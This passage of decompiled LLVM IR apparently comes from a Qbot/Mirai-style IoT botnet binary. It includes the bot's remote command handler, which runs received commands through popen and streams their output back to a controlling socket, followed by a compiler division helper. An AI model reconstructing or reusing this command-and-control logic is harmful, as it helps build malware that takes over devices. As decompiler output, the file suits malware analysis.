  br i1 %v2_f090, label %dec_label_pc_f098, label %dec_label_pc_f324.outer

dec_label_pc_f098:                                ; preds = %dec_label_pc_f088
  store i32 1024, i32* @r2, align 4
  %v3_f0b0 = call i32 @__GI_memset(i8* %v2_f0b0, i32 0)
  %v7_f0d0 = call i32 @szprintf(i32 %v2_f0a0, i32 ptrtoint ([8 x i8]* @global_var_1d1e8.575 to i32), i32 %v1_f01c, i32 %v2_f0a0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v3_f0ec = call i32 @fdpopen(i32 %v2_f0a0, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1d118.548, i32 0, i32 0))
  br label %dec_label_pc_f158

dec_label_pc_f0fc:                                ; preds = %dec_label_pc_f158
  %v2_f10c = call i32 @trim(i8* %v2_f0b0)
  %v2_f114 = load i32, i32* @global_var_27918.46, align 4
  store i32 %v2_f0a0, i32* @r2, align 4
  %v3_f130 = call i32 @Rootsprintf(i32 %v2_f114, i32 ptrtoint ([3 x i8]* @global_var_1d1f0.577 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_f14c = call i32 @__GI_memset(i8* %v2_f0b0, i32 0)
  %v1_f154 = call i32 @sleep(i32 1)
  br label %dec_label_pc_f158

dec_label_pc_f158:                                ; preds = %dec_label_pc_f098, %dec_label_pc_f0fc
  %v4_f170 = call i32 @fdgets(i32 %v2_f0a0, i32 1024, i32 %v3_f0ec, i32 %v2_f0a0)
  %v2_f178 = icmp eq i32 %v4_f170, 0
  br i1 %v2_f178, label %dec_label_pc_f180, label %dec_label_pc_f0fc

dec_label_pc_f180:                                ; preds = %dec_label_pc_f158
  %v1_f184 = call i32 @fdpclose(i32 %v3_f0ec)
  %v1_f18c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_f190

dec_label_pc_f190:                                ; preds = %dec_label_pc_f06c, %dec_label_pc_f180
  %v2_f1a4 = call i32 @__GI_strtok(i32 %v1_f01c, i32 ptrtoint (i32* @global_var_1d1f4.579 to i32))
  store i32 %v1_ef54, i32* %stack_var_-624, align 4
  %v2_f2a846 = icmp eq i32 %v2_f1a4, 0
  br i1 %v2_f2a846, label %dec_label_pc_f2b0, label %dec_label_pc_f1bc

dec_label_pc_f1bc:                                ; preds = %dec_label_pc_f190, %dec_label_pc_f290
  %stack_var_-36.049.in = phi i32 [ %v2_f298, %dec_label_pc_f290 ], [ %v2_f1a4, %dec_label_pc_f190 ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_f290 ], [ 1, %dec_label_pc_f190 ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_f1c0 = load i8, i8* %stack_var_-36.049, align 1
  %v7_f1c4 = icmp eq i8 %v2_f1c0, 10
  br i1 %v7_f1c4, label %dec_label_pc_f290, label %dec_label_pc_f1cc

dec_label_pc_f1cc:                                ; preds = %dec_label_pc_f1bc
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_f1d8 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f1e0 = add i32 %v3_f1d8, 1
  %v1_f1e8 = call i32 @malloc(i32 %v1_f1e0)
  %v0_f1fc = load i32, i32* @r4, align 4
  %v3_f1fc = mul i32 %v0_f1fc, 4
  %v2_f208 = add i32 %v2_f204, %v3_f1fc
  %v2_f20c = inttoptr i32 %v2_f208 to i32*
  store i32 %v1_f1e8, i32* %v2_f20c, align 4
  %v3_f21c = mul i32 %stack_var_-40.147, 4
  %v2_f224 = add i32 %v3_f21c, %v19_e71c
  %v2_f228 = add i32 %v2_f224, -600
  %v1_f22c = inttoptr i32 %v2_f228 to i32*
  %v2_f22c = load i32, i32* %v1_f22c, align 4
  store i32 %v2_f22c, i32* @r4, align 4
  %v3_f238 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f240 = add i32 %v3_f238, 1
  %v0_f244 = load i32, i32* @r4, align 4
  store i32 %v1_f240, i32* @r2, align 4
  %v2_f250 = inttoptr i32 %v0_f244 to i8*
  %v3_f250 = call i32 @__GI_memset(i8* %v2_f250, i32 0)
  %v2_f270 = load i32, i32* %v1_f22c, align 4
  store i32 %stack_var_-36.049.in, i32* @r1, align 4
  %v3_f280 = inttoptr i32 %v2_f270 to i8*
  %v4_f280 = call i32 @strcpy(i8* %v3_f280, i32 %stack_var_-36.049.in)
  %v1_f288 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_f290

dec_label_pc_f290:                                ; preds = %dec_label_pc_f1bc, %dec_label_pc_f1cc
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_f1bc ], [ %v1_f288, %dec_label_pc_f1cc ]
  %v2_f298 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1d1f4.579 to i32))
  %v2_f2a8 = icmp eq i32 %v2_f298, 0
  br i1 %v2_f2a8, label %dec_label_pc_f2b0, label %dec_label_pc_f1bc

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f290, %dec_label_pc_f190
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_f190 ], [ %stack_var_-40.0, %dec_label_pc_f290 ]
  %v3_f2bc = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_f2c8 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_f2c8, label %dec_label_pc_f324.outer, label %dec_label_pc_f2e0.lr.ph

dec_label_pc_f2e0.lr.ph:                          ; preds = %dec_label_pc_f2b0
  br label %dec_label_pc_f2e0

dec_label_pc_f2e0:                                ; preds = %dec_label_pc_f2e0.lr.ph, %dec_label_pc_f2e0
  %storemerge15128 = phi i32 [ 1, %dec_label_pc_f2e0.lr.ph ], [ %v1_f30c, %dec_label_pc_f2e0 ]
  %v3_f2ec = mul i32 %storemerge15128, 4
  %v2_f2f4 = add i32 %v3_f2ec, %v19_e71c
  %v2_f2f8 = add i32 %v2_f2f4, -600
  %v1_f2fc = inttoptr i32 %v2_f2f8 to i32*
  %v2_f2fc = load i32, i32* %v1_f2fc, align 4
  store i32 %v2_f2fc, i32* @r0, align 4
  %v0_f304 = call i32 @free()
  %v1_f30c = add nuw nsw i32 %storemerge15128, 1
  %v5_f320 = icmp slt i32 %v1_f30c, %stack_var_-40.1.lcssa
  br i1 %v5_f320, label %dec_label_pc_f2e0, label %dec_label_pc_f324.outer

dec_label_pc_f324.outer:                          ; preds = %dec_label_pc_f2e0, %dec_label_pc_eeb4, %dec_label_pc_f088, %dec_label_pc_f2b0, %dec_label_pc_ef10, %dec_label_pc_eac0
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_eac0 ], [ %stack_var_-96.1, %dec_label_pc_ef10 ], [ %stack_var_-96.1, %dec_label_pc_f2b0 ], [ %stack_var_-96.1, %dec_label_pc_f088 ], [ %stack_var_-96.1, %dec_label_pc_eeb4 ], [ %stack_var_-96.1, %dec_label_pc_f2e0 ]
  br label %dec_label_pc_f324

dec_label_pc_f324:                                ; preds = %dec_label_pc_f324.outer, %dec_label_pc_ee40
  %v2_f328 = load i32, i32* @global_var_27918.46, align 4
  %v5_f344 = call i32 @recvLine(i32 %v2_f328, i8* %v4_f344, i32 4096, i32 %v2_f334)
  %v3_f354 = icmp eq i32 %v5_f344, -1
  br i1 %v3_f354, label %dec_label_pc_eaa4.outer, label %dec_label_pc_ed70

; uselistorder directives
  uselistorder i32 %v5_f344, { 1, 0 }
  uselistorder i32 %storemerge15128, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_f298, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_f054, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_f01c, { 1, 0 }
  uselistorder i32 %v1_ef88, { 2, 1, 0 }
  uselistorder i8* %v5_ef58, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_ef54, { 3, 0, 2, 1, 4 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_ee8c, { 1, 2, 0 }
  uselistorder i1 %v9_eda4, { 1, 0 }
  uselistorder i32 %v3_edb8, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_ecf0, { 1, 0 }
  uselistorder i32 %v3_ed24, { 1, 2, 0, 3 }
  uselistorder i32 %v3_ec98, { 1, 0 }
  uselistorder i32 %v1_ec7c, { 1, 0 }
  uselistorder i32 %v5_ebb8, { 1, 0 }
  uselistorder i32 %v1_eb4c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_eb68, { 1, 0 }
  uselistorder i32 %v2_eb5c, { 1, 0 }
  uselistorder i32 %v2_f0a0, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_f344, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f334, { 9, 0, 3, 5, 4, 7, 6, 8, 1, 2 }
  uselistorder i32 %v2_ea1c, { 1, 0 }
  uselistorder i32 %v0_ea04, { 1, 0, 2, 3 }
  uselistorder i32 %v3_e9b8, { 1, 0, 2 }
  uselistorder i32 %v2_e91c, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32, i32)* @strstr, { 2, 0, 1, 3 }
  uselistorder i32* @global_var_27920.64, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_2db88.67, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 (i32, i32)* @Rootsprintf, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 16, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32* @global_var_2db7c.80, { 1, 0, 3, 2 }
  uselistorder i32* @global_var_27918.46, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder [2 x i8]* @global_var_1d118.548, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1d118.548 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1, 2, 3, 4, 20, 21, 18, 19 }
  uselistorder i32 ptrtoint (i32* @global_var_1d100.544 to i32), { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f324.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_f2e0, { 1, 0 }
  uselistorder label %dec_label_pc_f290, { 1, 0 }
  uselistorder label %dec_label_pc_f1bc, { 1, 0 }
  uselistorder label %dec_label_pc_f190, { 1, 0 }
  uselistorder label %dec_label_pc_f158, { 1, 0 }
  uselistorder label %dec_label_pc_f030, { 1, 0 }
  uselistorder label %dec_label_pc_f00c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_effc, { 1, 0 }
  uselistorder label %dec_label_pc_ef84, { 1, 0 }
  uselistorder label %dec_label_pc_eef0, { 1, 0 }
  uselistorder label %dec_label_pc_eeb4, { 1, 0 }
  uselistorder label %dec_label_pc_eddc, { 1, 0 }
  uselistorder label %dec_label_pc_ed64, { 1, 0 }
  uselistorder label %dec_label_pc_ecd4, { 1, 0 }
  uselistorder label %dec_label_pc_eb9c, { 1, 0 }
  uselistorder label %dec_label_pc_eab4, { 1, 0 }
  uselistorder label %dec_label_pc_eaa4.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ea8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ea00, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_e8d8, { 1, 0 }
  uselistorder label %dec_label_pc_e864, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_f3b4 = load i32, i32* @r1, align 4
  %v1_f3b4 = add i32 %v0_f3b4, -1
  store i32 %v1_f3b4, i32* %r2.global-to-local, align 4
  %v2_f3b4 = icmp eq i32 %v0_f3b4, 0
  %v7_f3b4 = icmp eq i32 %v0_f3b4, 1
  %v0_f3b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_f3b4, i32 %v0_f3b8)
  br i1 %v2_f3b4, label %dec_label_pc_f49c, label %dec_label_pc_f3c0

dec_label_pc_f3c0:                                ; preds = %entry
  %v0_f3c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_f3c0 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_f3c0, %v1_f3c0
  br i1 %tmp, label %dec_label_pc_f3c8, label %dec_label_pc_f454

dec_label_pc_f3c8:                                ; preds = %dec_label_pc_f3c0
  %v1_f3c8 = load i32, i32* %r2.global-to-local, align 4
  %v2_f3c8 = and i32 %v1_f3c8, %v1_f3c0
  %v4_f3c8 = icmp eq i32 %v2_f3c8, 0
  br i1 %v4_f3c8, label %dec_label_pc_f460, label %dec_label_pc_f3d0

dec_label_pc_f3d0:                                ; preds = %dec_label_pc_f3c8
  %v3_f3d0 = icmp ult i32 %v1_f3c0, 536870912
  br i1 %v3_f3d0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_f3d0
  %v4_f3d4 = mul i32 %v1_f3c0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_f3d0, %.thread
  %v0_f3f4.pr36.ph = phi i32 [ %v4_f3d4, %.thread ], [ %v1_f3c0, %dec_label_pc_f3d0 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_f3d0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_f3f4.pr36 = phi i32 [ %v4_f3e8, %bb81 ], [ %v0_f3f4.pr36.ph, %.preheader.preheader ]
  %v1_f3ec = phi i32 [ %v4_f3ec, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_f3e0 = icmp ugt i32 %v0_f3f4.pr36, 268435455
  br i1 %v2_f3e0, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_f3f4thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_f3e4 = icmp ult i32 %v0_f3f4.pr36, %v0_f3c0
  br i1 %v4_f3e4, label %bb80, label %dec_label_pc_f3f4thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_f3e8 = and i32 %v0_f3f4.pr36, 268435456
  %v3_f3e8 = icmp eq i32 %v2_f3e8, 0
  %v4_f3e8 = mul i32 %v0_f3f4.pr36, 16
  br i1 %v3_f3e8, label %bb81, label %dec_label_pc_f3f4.loopexit

bb81:                                             ; preds = %bb80
  %v2_f3ec = and i32 %v1_f3ec, 268435456
  %v3_f3ec = icmp eq i32 %v2_f3ec, 0
  %v4_f3ec = mul i32 %v1_f3ec, 16
  br i1 %v3_f3ec, label %.preheader, label %dec_label_pc_f3f4thread-pre-split.loopexit.loopexit

dec_label_pc_f3f4thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_f40048.ph = phi i32 [ %v1_f3ec, %bb ], [ %v4_f3ec, %bb81 ]
  %v0_f3f4.pr38.ph = phi i32 [ %v0_f3f4.pr36, %bb ], [ %v4_f3e8, %bb81 ]
  br label %dec_label_pc_f3f4thread-pre-split.loopexit

dec_label_pc_f3f4thread-pre-split.loopexit:       ; preds = %dec_label_pc_f3f4thread-pre-split.loopexit.loopexit, %.thread2
  %v1_f40048 = phi i32 [ %v1_f3ec, %.thread2 ], [ %v1_f40048.ph, %dec_label_pc_f3f4thread-pre-split.loopexit.loopexit ]
  %v0_f3f4.pr38 = phi i32 [ %v0_f3f4.pr36, %.thread2 ], [ %v0_f3f4.pr38.ph, %dec_label_pc_f3f4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f3f4thread-pre-split

dec_label_pc_f3f4thread-pre-split:                ; preds = %dec_label_pc_f3f4thread-pre-split.loopexit, %bb83
  %v1_f40046 = phi i32 [ %v1_f40048, %dec_label_pc_f3f4thread-pre-split.loopexit ], [ %v3_f400, %bb83 ]
  %v0_f3f4.pr = phi i32 [ %v0_f3f4.pr38, %dec_label_pc_f3f4thread-pre-split.loopexit ], [ %v3_f3fc, %bb83 ]
  br label %dec_label_pc_f3f4

dec_label_pc_f3f4.loopexit:                       ; preds = %bb80
  br label %dec_label_pc_f3f4

dec_label_pc_f3f4:                                ; preds = %dec_label_pc_f3f4.loopexit, %dec_label_pc_f3f4thread-pre-split
  %v1_f400 = phi i32 [ %v1_f40046, %dec_label_pc_f3f4thread-pre-split ], [ %v1_f3ec, %dec_label_pc_f3f4.loopexit ]
  %v1_f3fc = phi i32 [ %v0_f3f4.pr, %dec_label_pc_f3f4thread-pre-split ], [ %v4_f3e8, %dec_label_pc_f3f4.loopexit ]
  %v2_f3f4 = icmp slt i32 %v1_f3fc, 0
  br i1 %v2_f3f4, label %dec_label_pc_f408, label %bb82

bb82:                                             ; preds = %dec_label_pc_f3f4
  %v4_f3f8 = icmp ult i32 %v1_f3fc, %v0_f3c0
  br i1 %v4_f3f8, label %bb83, label %dec_label_pc_f408

bb83:                                             ; preds = %bb82
  %v3_f3fc = mul i32 %v1_f3fc, 2
  %v2_f400 = icmp slt i32 %v1_f400, 0
  %v3_f400 = mul i32 %v1_f400, 2
  br i1 %v2_f400, label %dec_label_pc_f408, label %dec_label_pc_f3f4thread-pre-split

dec_label_pc_f408:                                ; preds = %bb82, %dec_label_pc_f3f4, %bb83
  %v2_f41459 = phi i32 [ %v3_f400, %bb83 ], [ %v1_f400, %bb82 ], [ %v1_f400, %dec_label_pc_f3f4 ]
  %v1_f40c51 = phi i32 [ %v3_f3fc, %bb83 ], [ %v1_f3fc, %bb82 ], [ %v1_f3fc, %dec_label_pc_f3f4 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f40c

dec_label_pc_f40c:                                ; preds = %.thread11, %dec_label_pc_f408
  %v1_f440 = phi i32 [ %v4_f440, %.thread11 ], [ %v2_f41459, %dec_label_pc_f408 ]
  %v1_f414 = phi i32 [ %v0_f44c, %.thread11 ], [ 0, %dec_label_pc_f408 ]
  %v1_f444 = phi i32 [ %v4_f444, %.thread11 ], [ %v1_f40c51, %dec_label_pc_f408 ]
  %v1_f410 = phi i32 [ %v0_f43c, %.thread11 ], [ %v0_f3c0, %dec_label_pc_f408 ]
  %v3_f40c = icmp ult i32 %v1_f410, %v1_f444
  br i1 %v3_f40c, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_f40c
  %v3_f410 = sub i32 %v1_f410, %v1_f444
  store i32 %v3_f410, i32* %r0.global-to-local, align 4
  %v3_f414 = or i32 %v1_f414, %v1_f440
  store i32 %v3_f414, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_f40c, %bb84
  %v1_f41c = phi i32 [ %v1_f410, %dec_label_pc_f40c ], [ %v3_f410, %bb84 ]
  %v1_f420 = phi i32 [ %v1_f414, %dec_label_pc_f40c ], [ %v3_f414, %bb84 ]
  %v4_f418 = udiv i32 %v1_f444, 2
  %v6_f418 = icmp ult i32 %v1_f41c, %v4_f418
  br i1 %v6_f418, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_f41c = urem i32 %v1_f444, 2
  %v4_f41c = icmp eq i32 %v3_f41c, 0
  %v6_f41c = sub i32 %v1_f41c, %v4_f418
  store i32 %v6_f41c, i32* %r0.global-to-local, align 4
  br i1 %v4_f41c, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_f420 = udiv i32 %v1_f440, 2
  %v6_f420 = or i32 %v1_f420, %v5_f420
  store i32 %v6_f420, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_f428 = phi i32 [ %v6_f41c, %bb85 ], [ %v1_f41c, %.thread7 ], [ %v6_f41c, %bb86 ]
  %v1_f42c = phi i32 [ %v1_f420, %bb85 ], [ %v1_f420, %.thread7 ], [ %v6_f420, %bb86 ]
  %v4_f424 = udiv i32 %v1_f444, 4
  %v6_f424 = icmp ult i32 %v1_f428, %v4_f424
  br i1 %v6_f424, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_f428 = and i32 %v1_f444, 2
  %v4_f428 = icmp eq i32 %v3_f428, 0
  %v6_f428 = sub i32 %v1_f428, %v4_f424
  store i32 %v6_f428, i32* %r0.global-to-local, align 4
  br i1 %v4_f428, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_f42c = udiv i32 %v1_f440, 4
  %v6_f42c = or i32 %v1_f42c, %v5_f42c
  store i32 %v6_f42c, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_f434 = phi i32 [ %v6_f428, %bb87 ], [ %v1_f428, %.thread8 ], [ %v6_f428, %bb88 ]
  %v1_f438 = phi i32 [ %v1_f42c, %bb87 ], [ %v1_f42c, %.thread8 ], [ %v6_f42c, %bb88 ]
  %v4_f430 = udiv i32 %v1_f444, 8
  %v6_f430 = icmp ult i32 %v1_f434, %v4_f430
  br i1 %v6_f430, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_f434 = and i32 %v1_f444, 4
  %v4_f434 = icmp eq i32 %v3_f434, 0
  %v6_f434 = sub i32 %v1_f434, %v4_f430
  store i32 %v6_f434, i32* %r0.global-to-local, align 4
  br i1 %v4_f434, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_f438 = udiv i32 %v1_f440, 8
  %v6_f438 = or i32 %v1_f438, %v5_f438
  store i32 %v6_f438, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_f44c = phi i32 [ %v1_f438, %bb89 ], [ %v1_f438, %.thread9 ], [ %v6_f438, %bb90 ]
  %v0_f43c = phi i32 [ %v6_f434, %bb89 ], [ %v1_f434, %.thread9 ], [ %v6_f434, %bb90 ]
  %v2_f43c = icmp eq i32 %v0_f43c, 0
  br i1 %v2_f43c, label %dec_label_pc_f44c, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_f440, 16
  br i1 %tmp138, label %dec_label_pc_f44c, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_f440 = udiv i32 %v1_f440, 16
  %v4_f444 = udiv i32 %v1_f444, 16
  br label %dec_label_pc_f40c

dec_label_pc_f44c:                                ; preds = %thread-pre-split, %bb91
  store i32 %v0_f44c, i32* %r0.global-to-local, align 4
  ret i32 %v0_f44c

dec_label_pc_f454:                                ; preds = %dec_label_pc_f3c0
  %v9_f3c0 = icmp eq i32 %v0_f3c0, %v1_f3c0
  %. = zext i1 %v9_f3c0 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_f460:                                ; preds = %dec_label_pc_f3c8
  %v2_f460 = icmp ugt i32 %v1_f3c0, 65535
  br i1 %v2_f460, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_f460
  %v2_f464 = and i32 %v1_f3c0, 32768
  %v3_f464 = icmp eq i32 %v2_f464, 0
  %v4_f464 = udiv i32 %v1_f3c0, 65536
  br i1 %v3_f464, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_f460
  %v0_f47065 = phi i32 [ %v1_f3c0, %dec_label_pc_f460 ], [ %v4_f464, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_f474 = phi i32 [ %v0_f47065, %.thread16 ], [ %v4_f464, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_f470 = icmp ugt i32 %v1_f474, 255
  br i1 %v2_f470, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_f474 = and i32 %v1_f474, 128
  %v3_f474 = icmp eq i32 %v2_f474, 0
  %v4_f474 = udiv i32 %v1_f474, 256
  br i1 %v3_f474, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_f478 = or i32 %storemerge, 8
  store i32 %v2_f478, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_f484 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_f478, %bb98 ]
  %v1_f480 = phi i32 [ %v1_f474, %bb96 ], [ %v4_f474, %bb97 ], [ %v4_f474, %bb98 ]
  %v2_f47c = icmp ugt i32 %v1_f480, 15
  br i1 %v2_f47c, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_f480 = and i32 %v1_f480, 8
  %v3_f480 = icmp eq i32 %v2_f480, 0
  %v4_f480 = udiv i32 %v1_f480, 16
  br i1 %v3_f480, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_f484 = add nsw i32 %v1_f484, 4
  store i32 %v2_f484, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_f48c = phi i32 [ %v1_f484, %.thread17 ], [ %v1_f484, %bb99 ], [ %v2_f484, %bb100 ]
  %v5_f490 = phi i32 [ %v1_f480, %.thread17 ], [ %v4_f480, %bb99 ], [ %v4_f480, %bb100 ]
  %v2_f488 = icmp ugt i32 %v5_f490, 3
  %v7_f488 = icmp eq i32 %v5_f490, 4
  %v2_f48c = xor i1 %v7_f488, true
  %v3_f48c = and i1 %v2_f488, %v2_f48c
  br i1 %v3_f48c, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_f48c = add nsw i32 %v4_f48c, 3
  store i32 %v5_f48c, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_f490 = phi i32 [ %v4_f48c, %.thread18 ], [ %v5_f48c, %bb101 ]
  %v2_f490 = xor i1 %v2_f488, true
  %v3_f490 = or i1 %v7_f488, %v2_f490
  br i1 %v3_f490, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_f490 = udiv i32 %v5_f490, 2
  %v9_f490 = add i32 %v4_f490, %v8_f490
  store i32 %v9_f490, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_f494 = phi i32 [ %v4_f490, %bb102 ], [ %v9_f490, %bb103 ]
  %v6_f494 = lshr i32 %v0_f3c0, %v1_f494
  store i32 %v6_f494, i32* %r0.global-to-local, align 4
  ret i32 %v6_f494

dec_label_pc_f49c:                                ; preds = %entry
  %v0_f4a0 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_f490, { 1, 0 }
  uselistorder i1 %v7_f488, { 1, 0 }
  uselistorder i32 %v4_f480, { 1, 0 }
  uselistorder i32 %v1_f480, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f478, { 1, 0 }
  uselistorder i32 %v4_f474, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f474, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f464, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_f43c, { 1, 0 }
  uselistorder i32 %v0_f44c, { 1, 0, 2 }
  uselistorder i32 %v4_f430, { 1, 0 }
  uselistorder i32 %v1_f438, { 1, 2, 0 }
  uselistorder i32 %v4_f424, { 1, 0 }
  uselistorder i32 %v1_f42c, { 1, 2, 0 }
  uselistorder i32 %v4_f418, { 1, 0 }
  uselistorder i32 %v1_f420, { 1, 2, 0 }
  uselistorder i32 %v1_f444, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_f414, { 1, 0 }
  uselistorder i32 %v1_f440, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_f400, { 1, 0 }
  uselistorder i32 %v3_f3fc, { 1, 0 }
